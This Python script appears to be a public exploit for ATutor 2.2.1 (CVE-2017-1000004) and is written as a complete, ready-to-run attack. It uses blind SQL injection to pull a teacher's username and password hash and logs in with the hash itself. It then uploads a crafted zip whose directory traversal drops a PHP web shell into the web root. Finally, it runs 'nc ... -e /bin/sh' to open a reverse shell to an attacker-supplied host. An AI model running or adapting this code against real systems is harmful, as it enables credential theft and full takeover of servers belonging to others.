#!/usr/bin/python3

# CVE: CVE-2017-1000004 (https://www.cvedetails.com/cve/CVE-2017-1000004/)
# There might be other CVEs related to this issue. I think this one is the most relevant one.
# Also, look at this page: https://www.securityfocus.com/bid/99599

# EXPLOIT METHOD:
# 1) SQL injection allows to retrieve a password hash for a teacher account.
# 2) Retrieved hash can be used to bypass authentication.
# 3) A malicious zip file is then crafted and uploaded. Thanks to a directory traversal, an arbitrary php file can be uploaded to the web root.

# Author: werebug (https://werebug.com)
# Software: ATutor 2.2.1

import sys
import re
import requests
import hashlib
import zipfile
from io import BytesIO
from bs4 import BeautifulSoup

def searchFriends_sqli(ip, inj_str, session):
    for i in range(32,126):
        cinj = inj_str.replace("CHAR", str(i))
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, cinj)
        r = session.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return i
    return None

def inject(ip, select, session):
    extracted = ""
    for i in range(1,50):
        injection_string = "TEST')/**/OR/**/(SELECT/**/ASCII(SUBSTR((%s),%d,1)))=CHAR%%23" % (select, i)
        c = searchFriends_sqli(ip, injection_string, session)
        if c != None:
            extracted += chr(c)
            print(chr(c), end="", flush=True)
        else:
            break;
    print()
    return extracted

def hash_login(ip, username, h, session):
    target = "http://%s/ATutor/login.php" %ip
    token = "random_token"
    secret_hash = hashlib.sha1(bytes(h + token, 'utf8')).hexdigest()
    data = {
        'form_password_hidden': secret_hash,
        'form_login': username,
        'token': token,
        'submit': 'Login'
    }
    res = session.post(target, data=data)
    if "Create Course: My Start Page" in res.text or "My Courses: My Start Page" in res.text:
        return (True, res)
    return (False, res)

def getCourseId(start_page):
    courses = re.findall(r'bounce\.php\?course=(\d+)', start_page.text)
    for i in courses:
        if i != '0':
            return i
    return None

def build_zip():
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../../../../var/www/html/ATutor/mods/rce.phtml', '<?php echo shell_exec($_REQUEST["cmd"]); ?>')
    z.writestr('imsmanifest.xml', 'pwnd')
    z.close()
    zip = open('evil.zip', 'wb')
    zip.write(f.getvalue())
    zip.close()

def uploadZipFile(ip, session):
    target = "http://%s/ATutor/mods/_standard/tests/import_test.php" % ip
    files = {
        "file": ('evil.zip', open('evil.zip', 'rb'), 'application/zip')
    }
    data = {
        "submit_import": "Import"
    }
    r = session.post(target, files=files, data=data)
    if "XML error" in r.text:
        return True
    else:
        return False

def RCE(ip, session, command):
    target = "http://%s/ATutor/mods/rce.phtml" % ip
    data = {
        'cmd': command
    }
    output = session.post(target, data=data)
    return output.text.strip()

def main():
    if len(sys.argv) != 4:
        print("(+) usage: %s <target> <attacker-ip> <port>" % sys.argv[0])
        print('(+) eg: %s 192.168.1.100 192.168.1.10 4567' % sys.argv[0])
    ip = sys.argv[1]
    rip = sys.argv[2]
    rport = sys.argv[3]

    print("Initiliasing requests session...")
    sess = requests.Session()

    print("Extracting username:")
    select = "SELECT/**/login/**/FROM/**/AT_members/**/WHERE/**/status=3/**/LIMIT/**/1"
    username = inject(ip, select, sess);

    print("Extracting password hash:")
    select = "SELECT/**/password/**/FROM/**/AT_members/**/WHERE/**/login='%s'/**/LIMIT/**/1" % username
    password = inject(ip, select, sess)

    print("Trying to login... ", end="")
    (success, l_response) = hash_login(ip, username, password, sess)
    if success:
        print("Success.")
    else:
        print("Login failed.")
        exit(1)

    print("Retrieving course id... ", end="")
    c_id = getCourseId(l_response)
    if c_id != None:
        print("Found: " + c_id)
    else:
        print("Not found.")
        exit(1)

    print("Querying course page...", end="")
    sess.get(("http://%s/ATutor/bounce.php?course=" % ip) + c_id)
    print("Done.")

    print("Building evil zip file...", end="")
    build_zip()
    print("Done.")

    print("Uploading zip file...", end="")
    uploaded = uploadZipFile(ip, sess)
    if uploaded:
        print("Done.")
    else:
        print("Upload failed.")
        exit(1)

    print("Testing RCE: ", end="")
    if RCE(ip, sess, "echo success") == "success":
        print("Success.")
    else:
        print('Failed.')
        exit(1)

    print("Triggering reverse shell to %s:%s." %(rip, rport))
    RCE(ip, sess, "nc " + rip + " " + rport + " -e /bin/sh")

if __name__ == "__main__":
    main()
